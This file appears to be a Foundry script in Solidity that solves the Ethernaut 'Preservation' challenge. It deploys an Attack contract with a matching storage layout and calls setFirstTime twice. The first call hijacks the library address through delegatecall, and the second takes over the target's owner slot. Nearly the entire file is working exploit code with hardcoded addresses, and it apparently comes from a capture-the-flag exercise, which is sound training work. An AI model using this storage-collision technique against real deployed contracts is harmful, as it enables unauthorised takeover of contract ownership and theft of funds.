// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Preservation} from "../src/Preservation.sol";


interface IPreservation {
    function setFirstTime(uint256 _timestamp) external;
    function owner() external view returns (address);
}

contract Attack {
    address public slot0;
    address public slot1;
    address public owner;

    function setTime(uint256 _value) public {
        owner = address(uint160(_value));
    }
}

contract PreservationScript is Script {
    address private constant PRESERVATION_ADDRESS = 0x0f98cd1bf3c86260EcF4ef7E3e47D59Ce8344c53;
    address private constant PLAYER_ADDRESS = 0x8fe205351ADE3b32245FFcBa2F58141Fa3B0a20F;

    function run() external {
    vm.startBroadcast();

    IPreservation target = IPreservation(PRESERVATION_ADDRESS);

    Attack attack = new Attack();
    console.log("attack address is:", address(attack));
    console.log("Current owner is:", target.owner());

    target.setFirstTime(uint256(uint160(address(attack))));
    target.setFirstTime(uint256(uint160(PLAYER_ADDRESS)));

    console.log("Final owner is:", target.owner());

    vm.stopBroadcast();
    }
}
